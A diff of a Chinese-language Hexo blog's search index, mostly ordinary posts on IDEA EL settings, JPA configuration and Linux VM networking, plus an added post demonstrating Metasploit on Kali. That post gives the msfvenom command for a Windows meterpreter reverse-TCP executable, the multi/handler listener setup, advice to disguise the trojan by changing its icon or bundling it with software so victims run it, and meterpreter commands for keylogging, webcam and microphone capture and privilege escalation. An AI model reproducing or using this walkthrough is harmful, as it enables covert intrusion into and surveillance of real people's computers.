-<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
-<p>按住Ctrl点击链接，到78行左右就可以看到一段注释</p>
-<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">This is the XML DTD <span class="keyword">for</span> the Servlet <span class="number">2.3</span> deployment descriptor.</span><br><span class="line">All Servlet <span class="number">2.3</span> deployment descriptors must include a DOCTYPE</span><br><span class="line">of the following form:</span><br><span class="line"> &lt;!DOCTYPE web-app PUBLIC</span><br><span class="line">  <span class="string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span><br><span class="line">  <span class="string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span>&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
-<p>翻译一下就是</p>
-<p>“这是Servlet 2.3部署描述符的XML DTD。所有的Servlet 2.3部署描述符必须包含于下面的DOCTYPE”<br> 很明显这就是Servlet 2.3版本</p>
-<p>所以</p>
-<p>isELIgnored的属性默认为true</p>
-]]></content>
-      <categories>
-        <category>工具使用问题</category>
-      </categories>
-      <tags>
-        <tag>IDEA使用问题</tag>
-      </tags>
   </entry>
   <entry>
     <title>Hadoop集群环境搭建2</title>
@@ -1089,6 +1059,93 @@
       </tags>
   </entry>
   <entry>
+    <title>IDEA使用$符号失效问题</title>
+    <url>/post/7fbc5666.html</url>
+    <content><![CDATA[<p>　　今天在使用IDEA开发maven项目的时候遇到不加载EL表达式的问题<span id="more"></span><br><img src="https://s3.ax1x.com/2020/12/15/rMuP41.png" alt="rMuP41.png">]</p>
+<p>结果却显示为</p>
+<p><img src="https://s3.ax1x.com/2020/12/15/rMuF9x.png" alt="rMuF9x.png">]</p>
+<font color="ff0000">解决办法</font>
+
+<p>在jsp开头添加</p>
+<figure class="highlight erb"><table><tr><td class="code"><pre><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@page isELIgnored=<span class="string">&quot;false&quot;</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>isELIgnored是指是否忽略EL表达式</p>
+<p>之所以形成这种问题，是因为JSP2.0以上isELIgnored默认是true</p>
+<p>isELIgnored 属性JSP 2.0 新引入的属性，在只支持 JSP 1.2  及早期版本的服务器中，使用这项属性是不合法的。这个属性的默认值依赖于 Web 应用所使用的 web.xml 的版本。如果 web.xml 指定  servlet 2.3（对应JSP 1.2）或更早版本，默认值为 true（但变更默认值依旧是合法的，JSP 2.0  兼容的服务器中都允许使用这项属性，不管 web.xml 的版本如何）</p>
+<p>查看Servlet版本</p>
+<p>打开web.xml文件就可以看到</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br></pre></td></tr></table></figure>
+<p>按住Ctrl点击链接，到78行左右就可以看到一段注释</p>
+<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">This is the XML DTD <span class="keyword">for</span> the Servlet <span class="number">2.3</span> deployment descriptor.</span><br><span class="line">All Servlet <span class="number">2.3</span> deployment descriptors must include a DOCTYPE</span><br><span class="line">of the following form:</span><br><span class="line"> &lt;!DOCTYPE web-app PUBLIC</span><br><span class="line">  <span class="string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span><br><span class="line">  <span class="string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span>&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>翻译一下就是</p>
+<p>“这是Servlet 2.3部署描述符的XML DTD。所有的Servlet 2.3部署描述符必须包含于下面的DOCTYPE”<br> 很明显这就是Servlet 2.3版本</p>
+<p>所以</p>
+<p>isELIgnored的属性默认为true</p>
+]]></content>
+      <categories>
+        <category>工具使用问题</category>
+      </categories>
+      <tags>
+        <tag>IDEA使用问题</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JPA框架学习</title>
+    <url>/post/9af0416b.html</url>
+    <content><![CDATA[<h1 id="1-orm思想"><a href="#1-orm思想" class="headerlink" title="1 orm思想"></a>1 orm思想</h1><p>　　就是相当于操作实体类就是操作数据库表，需要先建立两个映射关系（实体类和表、实体类中的属性和表中字段），实现了orm思想的框架：mybatis、hibernate<span id="more"></span></p>
+<h1 id="2-Hibernate框架介绍"><a href="#2-Hibernate框架介绍" class="headerlink" title="2 Hibernate框架介绍"></a>2 Hibernate框架介绍</h1><p>　　Hibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，他将POJO与数据库表建立映射关系，是一个全自动的ORM框架</p>
+<h1 id="3-JPA规范"><a href="#3-JPA规范" class="headerlink" title="3 JPA规范"></a>3 JPA规范</h1><p>　　内部是由接口和抽象类组成</p>
+<h1 id="4-代码实战"><a href="#4-代码实战" class="headerlink" title="4 代码实战"></a>4 代码实战</h1><h2 id="4-1-maven依赖"><a href="#4-1-maven依赖" class="headerlink" title="4.1 maven依赖"></a>4.1 maven依赖</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="4-2-XML配置"><a href="#4-2-XML配置" class="headerlink" title="4.2 XML配置"></a>4.2 XML配置</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">persistence</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/persistence&quot;</span> <span class="attr">version</span>=<span class="string">&quot;2.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--需要配置persistence-unit节点</span></span><br><span class="line"><span class="comment">        持久化单元</span></span><br><span class="line"><span class="comment">            name：持久化单元名称</span></span><br><span class="line"><span class="comment">            transaction-type：事务管理方式--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">persistence-unit</span> <span class="attr">name</span>=<span class="string">&quot;myJpa&quot;</span> <span class="attr">transaction-type</span>=<span class="string">&quot;RESOURCE_LOCAL&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--JPA的实现方式--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">provider</span>&gt;</span>org.hibernate.jpa.HibernatePersistenceProvider<span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--可选配置：配置JPA实现方式的配置信息--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--数据库信息</span></span><br><span class="line"><span class="comment">                    1.用户名       javax.persistence.jdbc.user</span></span><br><span class="line"><span class="comment">                    2.密码         javax.persistence.jdbc.password</span></span><br><span class="line"><span class="comment">                    3.驱动         javax.persistence.jdbc.driver</span></span><br><span class="line"><span class="comment">                    4.数据库地址   javax.persistence.jdbc.url --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;javax.persistence.jdbc.user&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;javax.persistence.jdbc.password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;javax.persistence.jdbc.driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;javax.persistence.jdbc.url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql:///jpa&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">&lt;!--配置JPA实现方（hibernate）的配置信息</span></span><br><span class="line"><span class="comment">                    显示sql   false|true</span></span><br><span class="line"><span class="comment">                    自动创建数据库表    hibernate.hbm2ddl.auto</span></span><br><span class="line"><span class="comment">                        create      此程序运行时创建数据库表（如果有表，删除表在创建）</span></span><br><span class="line"><span class="comment">                        update      程序运行时创建表（有表就不会创建）</span></span><br><span class="line"><span class="comment">                        none        不创建表--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.show_sql&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.hbm2ddl.auto&quot;</span> <span class="attr">value</span>=<span class="string">&quot;create&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">persistence-unit</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">persistence</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="五-JPA注解"><a href="#五-JPA注解" class="headerlink" title="五 JPA注解"></a>五 JPA注解</h1><div class="table-container">
+<table>
+<thead>
+<tr>
+<th>注解</th>
+<th>解释</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>@Entity</td>
+<td>声明类为实体或表</td>
+</tr>
+<tr>
+<td>@Table</td>
+<td>声明表名</td>
+</tr>
+<tr>
+<td>@Basic</td>
+<td>指定非约束明确的各个字段</td>
+</tr>
+<tr>
+<td>@Embedded</td>
+<td></td>
+</tr>
+<tr>
+<td>@GeneratedValue</td>
+<td>配置主键生成策略（IDENTITY自增，SEQUENCE序列，TABLE通过数据库表的形式完成自增，AUTO自动选择）</td>
+</tr>
+<tr>
+<td>@Column</td>
+<td>配置属性和字段的映射关系</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td></td>
+</tr>
+</tbody>
+</table>
+</div>
+]]></content>
+  </entry>
+  <entry>
     <title>JDBC使用</title>
     <url>/post/b6296e7c.html</url>
     <content><![CDATA[<p>　　全称为：Java Data Base Connectivity（java数据库连接），可以为多种数据库提供填统一的访问。JDBC是sun开打的一套数据库访问编程接口。<span id="more"></span></p>
@@ -1183,77 +1240,6 @@
       </tags>
   </entry>
   <entry>
-    <title>JPA框架学习</title>
-    <url>/post/9af0416b.html</url>
-    <content><![CDATA[<h1 id="1-orm思想"><a href="#1-orm思想" class="headerlink" title="1 orm思想"></a>1 orm思想</h1><p>　　就是相当于操作实体类就是操作数据库表，需要先建立两个映射关系（实体类和表、实体类中的属性和表中字段），实现了orm思想的框架：mybatis、hibernate<span id="more"></span></p>
-<h1 id="2-Hibernate框架介绍"><a href="#2-Hibernate框架介绍" class="headerlink" title="2 Hibernate框架介绍"></a>2 Hibernate框架介绍</h1><p>　　Hibernate是一个开放源代码的对象关系映射框架，它对JDBC进行了非常轻量级的对象封装，他将POJO与数据库表建立映射关系，是一个全自动的ORM框架</p>
-<h1 id="3-JPA规范"><a href="#3-JPA规范" class="headerlink" title="3 JPA规范"></a>3 JPA规范</h1><p>　　内部是由接口和抽象类组成</p>
-<h1 id="4-代码实战"><a href="#4-代码实战" class="headerlink" title="4 代码实战"></a>4 代码实战</h1><h2 id="4-1-maven依赖"><a href="#4-1-maven依赖" class="headerlink" title="4.1 maven依赖"></a>4.1 maven依赖</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-data-jpa<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h2 id="4-2-XML配置"><a href="#4-2-XML配置" class="headerlink" title="4.2 XML配置"></a>4.2 XML配置</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">persistence</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://java.sun.com/xml/ns/persistence&quot;</span> <span class="attr">version</span>=<span class="string">&quot;2.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!--需要配置persistence-unit节点</span></span><br><span class="line"><span class="comment">        持久化单元</span></span><br><span class="line"><span class="comment">            name：持久化单元名称</span></span><br><span class="line"><span class="comment">            transaction-type：事务管理方式--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">persistence-unit</span> <span class="attr">name</span>=<span class="string">&quot;myJpa&quot;</span> <span class="attr">transaction-type</span>=<span class="string">&quot;RESOURCE_LOCAL&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--JPA的实现方式--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">provider</span>&gt;</span>org.hibernate.jpa.HibernatePersistenceProvider<span class="tag">&lt;/<span class="name">provider</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--可选配置：配置JPA实现方式的配置信息--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--数据库信息</span></span><br><span class="line"><span class="comment">                    1.用户名       javax.persistence.jdbc.user</span></span><br><span class="line"><span class="comment">                    2.密码         javax.persistence.jdbc.password</span></span><br><span class="line"><span class="comment">                    3.驱动         javax.persistence.jdbc.driver</span></span><br><span class="line"><span class="comment">                    4.数据库地址   javax.persistence.jdbc.url --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;javax.persistence.jdbc.user&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;javax.persistence.jdbc.password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;javax.persistence.jdbc.driver&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;javax.persistence.jdbc.url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql:///jpa&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">&lt;!--配置JPA实现方（hibernate）的配置信息</span></span><br><span class="line"><span class="comment">                    显示sql   false|true</span></span><br><span class="line"><span class="comment">                    自动创建数据库表    hibernate.hbm2ddl.auto</span></span><br><span class="line"><span class="comment">                        create      此程序运行时创建数据库表（如果有表，删除表在创建）</span></span><br><span class="line"><span class="comment">                        update      程序运行时创建表（有表就不会创建）</span></span><br><span class="line"><span class="comment">                        none        不创建表--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.show_sql&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;hibernate.hbm2ddl.auto&quot;</span> <span class="attr">value</span>=<span class="string">&quot;create&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">persistence-unit</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">persistence</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<h1 id="五-JPA注解"><a href="#五-JPA注解" class="headerlink" title="五 JPA注解"></a>五 JPA注解</h1><div class="table-container">
-<table>
-<thead>
-<tr>
-<th>注解</th>
-<th>解释</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>@Entity</td>
-<td>声明类为实体或表</td>
-</tr>
-<tr>
-<td>@Table</td>
-<td>声明表名</td>
-</tr>
-<tr>
-<td>@Basic</td>
-<td>指定非约束明确的各个字段</td>
-</tr>
-<tr>
-<td>@Embedded</td>
-<td></td>
-</tr>
-<tr>
-<td>@GeneratedValue</td>
-<td>配置主键生成策略（IDENTITY自增，SEQUENCE序列，TABLE通过数据库表的形式完成自增，AUTO自动选择）</td>
-</tr>
-<tr>
-<td>@Column</td>
-<td>配置属性和字段的映射关系</td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-<td></td>
-</tr>
-<tr>
-<td></td>
-</tr>
-</tbody>
-</table>
-</div>
-]]></content>
-  </entry>
-  <entry>
-    <title>Java集合继承结构</title>
-    <url>/post/cb9bdb06.html</url>
-    <content><![CDATA[<p>　　集合这部分只是很杂乱，这个是搜集的一些资料，很清楚的梳理了集合知识和各个集合类型的特点<span id="more"></span></p>
-<p><img src="https://s3.ax1x.com/2020/12/13/reBQmt.png" alt="reBQmt.png"></p>
-<p><img src="https://s3.ax1x.com/2020/12/13/reBKOI.png" alt="reBKOI.png"></p>
-]]></content>
-      <categories>
-        <category>Java</category>
-      </categories>
-      <tags>
-        <tag>Java</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>JavaScript学习</title>
     <url>/post/d3a7443d.html</url>
     <content><![CDATA[<p>　　在学习小程序期间，没有了解JavaScript，回来补充<span id="more"></span></p>
@@ -1275,6 +1261,101 @@
       </categories>
       <tags>
         <tag>JavaScript</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Java集合继承结构</title>
+    <url>/post/cb9bdb06.html</url>
+    <content><![CDATA[<p>　　集合这部分只是很杂乱，这个是搜集的一些资料，很清楚的梳理了集合知识和各个集合类型的特点<span id="more"></span></p>
+<p><img src="https://s3.ax1x.com/2020/12/13/reBQmt.png" alt="reBQmt.png"></p>
+<p><img src="https://s3.ax1x.com/2020/12/13/reBKOI.png" alt="reBKOI.png"></p>
+]]></content>
+      <categories>
+        <category>Java</category>
+      </categories>
+      <tags>
+        <tag>Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Kali使用msf演示</title>
+    <url>/post/4cf34f0f.html</url>
+    <content><![CDATA[<h1 id="1-什么是MSF"><a href="#1-什么是MSF" class="headerlink" title="1 什么是MSF"></a>1 什么是MSF</h1><p>Metasploit framework 简称msf，他是一个渗透测试平台，能够查找，利用和验证漏洞。</p>
+<p>Metasploit是一个免费的，可下载的框架，通过它可以很容易的对计算机软件漏洞实施攻击。它本身是附带数百个已知软件漏洞的专业级漏洞攻击工具。<span id="more"></span></p>
+<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220324-cb589f2d4af04031a121b69cfe7b77b7.png" alt="img"></p>
+<p>模块分为：</p>
+<p>辅助模块———————AUX</p>
+<p>渗透攻击模块————exploits</p>
+<p>后渗透攻击模块———post</p>
+<p>攻击载荷模块————-payloads</p>
+<p>编码器模块——————encoders</p>
+<p>空指令模块——————nops</p>
+<h1 id="2-基本使用方法"><a href="#2-基本使用方法" class="headerlink" title="2 基本使用方法"></a>2 基本使用方法</h1><ol>
+<li><p>在终端中输入<code>msfconsole</code>可以打开这个软件</p>
+<p>这里显示的是我们有多少个模块<img src="https://gitee.com/q1jy/images/raw/master/img/20220324-image-20220324110431455.png" alt="image-20220324110431455"></p>
+</li>
+<li><p>常用命令</p>
+<p>| 常用命令      | 作用                           |<br>| ——————- | ——————————————— |<br>| connect IP    | 远程连接主机，一般用于内网渗透 |<br>| show exploits | 列出框架中所有的攻击渗透模块   |<br>| search _<em>_</em>  | 条件搜索                       |</p>
+<p>比如<code>search ms17_010</code>搜索这个漏洞</p>
+<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220324-image-20220324203338674.png" alt="image-20220324203338674"></p>
+<p>rank是等级，按可靠性降序排列</p>
+<p>excellent——-great—good—-normal—-average—-low—-manual</p>
+</li>
+</ol>
+<h1 id="3-生成可执行木马"><a href="#3-生成可执行木马" class="headerlink" title="3 生成可执行木马"></a>3 生成可执行木马</h1><ol>
+<li><p>命令：<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=本地ip lport=本地端口号 -f exe -o 文件名.exe</code></p>
+<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220325-image-20220325120742191.png" alt="image-20220325120742191"></p>
+</li>
+<li><p><code>msfconsole</code>打开msf</p>
+</li>
+<li><p>配置参数</p>
+<p>(1)命令： <code>use exploit/multi/handler</code>（选择模块）</p>
+<p>(2)命令： <code>set payload windows/meterpreter/reverse_tcp</code>（选择攻击模块）</p>
+<p>(3)命令： <code>set LhOST 192.168.32.1</code>（填写自己主机的IP地址）</p>
+<p>(4)命令： <code>set lport 1111</code>（填写刚才生成文件时的端口号）</p>
+<p>(5)命令： <code>show options</code>（查看设置参数）</p>
+<p>(6)命令： <code>exploit -z -j</code>（后台执行）</p>
+<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220325-image-20220325121212843.png" alt="image-20220325121212843"></p>
+</li>
+<li><p>在靶机打开可执行文件</p>
+<p>这里可以把程序伪装一下，改一下图标，或者把它捆绑在某些软件上面，当用户打开就自动安装到对方电脑上</p>
+</li>
+<li><p>查看用户</p>
+<p>(1)命令：sessions（查看上钩用户）</p>
+<p>(2)命令：sessions -i 1（选择需要攻击的用户，这里选1）</p>
+<p><img src="https://gitee.com/q1jy/images/raw/master/img/20220325-image-20220325121313086.png" alt="image-20220325121313086"></p>
+<p>出现meterpreter就已经成功了</p>
+</li>
+<li><p>meterpreter入侵对方电脑的命令</p>
+<p>(1)监控对方电脑屏幕</p>
+<p><code>run vnc -i</code></p>
+<p>(2)更多命令</p>
+<blockquote>
+<p>cmd指令:<br>cat 读取文件内容到屏幕<br>cd 更改目录<br>checksum 检索文件的校验和<br>cp 将源复制到目标<br>del 删除指定文件<br>dir 列出文件（ls 的别名）<br>下载 下载文件或目录<br>编辑 编辑文件<br>getlwd 打印本地工作目录<br>getwd 打印工作目录<br>lcd 更改本地工作目录<br>lls 列出本地文件<br>lpwd 打印本地工作目录<br>ls 列出文件<br>mkdir 创建目录<br>mv 将源移动到目标<br>pwd 打印工作目录<br>rm 删除指定文件<br>rmdir 删除目录<br>search 搜索文件<br>show_mount 列出所有挂载点/逻辑驱动器<br>upload 上传文件或目录<br>pkill 按名称终止进程</p>
+<p>meterpreter命令：<br>keyscan_start 开始捕获击键（开始键盘记录）<br>keyscan_dump 转储按键缓冲（下载键盘记录）<br>keyscan_stop 停止捕获击键（停止键盘记录）<br>record_mic X秒从默认的麦克风record_mic音频记录（音频录制）<br>webcam_chat 开始视频聊天（视频，对方会有弹窗）<br>webcam_list 单摄像头（查看摄像头列表）<br>webcam_snap 采取快照从指定的摄像头（摄像头拍摄一张照片）<br>webcam_stream 播放视频流从指定的摄像头（开启摄像头监控）<br>enumdesktops 列出所有可访问的桌面和窗口站（窗体列表）<br>getdesktop 得到当前的Meterpreter桌面<br>reboot 重新启动远程计算机<br>shutdown 关闭远程计算机<br>shell 放入系统命令 shell<br>enumdesktops 列出所有可访问的桌面和窗口站<br>getdesktop 获取当前的meterpreter桌面<br>idletime 返回远程用户空闲的秒数<br>keyboard_send 发送击键<br>keyevent 发送按键事件<br>keyscan_dump 转储击键缓冲区<br>keyscan_start 开始捕获击键<br>keyscan_stop 停止捕获击键<br>mouse 发送鼠标事件<br>screenshare 实时观看远程用户桌面<br>screenshot 抓取交互式桌面的屏幕截图<br>setdesktop 更改 Meterpreters 当前桌面<br>uictl 控制一些用户界面组件<br>record_mic 从默认麦克风录制音频 X 秒<br>webcam_chat 开始视频聊天<br>webcam_list 列出网络摄像头<br>webcam_snap 从指定的网络摄像头拍摄快照<br>webcam_stream 播放来自指定网络摄像头的视频流<br>play 在目标系统上播放波形音频文件 (.wav)<br>getsystem 尝试将您的权限提升到本地系统的权限<br>execute -f notepad 打开记事本</p>
+</blockquote>
+</li>
+</ol>
+]]></content>
+  </entry>
+  <entry>
+    <title>Linux虚拟机网络配置</title>
+    <url>/post/f05f2e38.html</url>
+    <content><![CDATA[<p>　　每次新建完虚拟机之后忘记快照，都得重新安装虚拟机并且配置网络，把配置过程记录在这里。<span id="more"></span></p>
+<p><strong>1.VMware选择NAT模式</strong></p>
+<p>一定要确保虚拟机选择的是NAT模式</p>
+<p><strong>2.在虚拟机中操作</strong></p>
+<p>需要点击虚拟机的“虚拟网络编辑器”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1621571249-image-20210521122728538.png" alt="image-20210521122728538" style="zoom: 50%;" /></p>
+<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1621571363-image-20210521122922933.png" alt="image-20210521122922933" style="zoom:67%;" /></p>
+<p><code>vi /etc/sysconfig/network-scripts/ifcfg-ens33</code></p>
+<p>根据IP修改为以下内容</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">TYPE=Ethernet <span class="comment">#网络类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.将这个更改为none</span></span><br><span class="line">BOOTPROTO=none <span class="comment">#IP获取方式，有dhcp自动获取和静态IP（none/static）</span></span><br><span class="line"></span><br><span class="line">NAME=ens33 <span class="comment">#网络名称</span></span><br><span class="line">UUID=d1755a41-8026-42f1-871d-9cd78fa2aa3c </span><br><span class="line">DEVICE=ens33 <span class="comment">#驱动名称</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.更改为yes</span></span><br><span class="line">ONBOOT=yes <span class="comment">#设置开机启动</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.添加以下内容</span></span><br><span class="line">IPADDR=192.168.137.3 <span class="comment">#设置静态IP地址，结合上图填写</span></span><br><span class="line">NETMASK=255.255.255.0 <span class="comment">#子网掩码</span></span><br><span class="line">GATEWAY=192.168.137.254 <span class="comment">#网关，结合上图填写</span></span><br><span class="line">DNS1=114.114.114.114 <span class="comment">#DNS</span></span><br><span class="line">DNS2=202.96.134.133</span><br></pre></td></tr></table></figure>
+<p>保存退出后重启网络服务</p>
+<p><code>systemctl restart network.service</code></p>
+]]></content>
+      <tags>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -1342,26 +1423,6 @@
         <tag>创建项目</tag>
         <tag>Maven</tag>
         <tag>环境配置</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Linux虚拟机网络配置</title>
-    <url>/post/f05f2e38.html</url>
-    <content><![CDATA[<p>　　每次新建完虚拟机之后忘记快照，都得重新安装虚拟机并且配置网络，把配置过程记录在这里。<span id="more"></span></p>
-<p><strong>1.VMware选择NAT模式</strong></p>
-<p>一定要确保虚拟机选择的是NAT模式</p>
-<p><strong>2.在虚拟机中操作</strong></p>
-<p>需要点击虚拟机的“虚拟网络编辑器”</p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1621571249-image-20210521122728538.png" alt="image-20210521122728538" style="zoom: 50%;" /></p>
-<p><img src="https://cdn.jsdelivr.net/gh/qnjy/images/data/1621571363-image-20210521122922933.png" alt="image-20210521122922933" style="zoom:67%;" /></p>
-<p><code>vi /etc/sysconfig/network-scripts/ifcfg-ens33</code></p>
-<p>根据IP修改为以下内容</p>
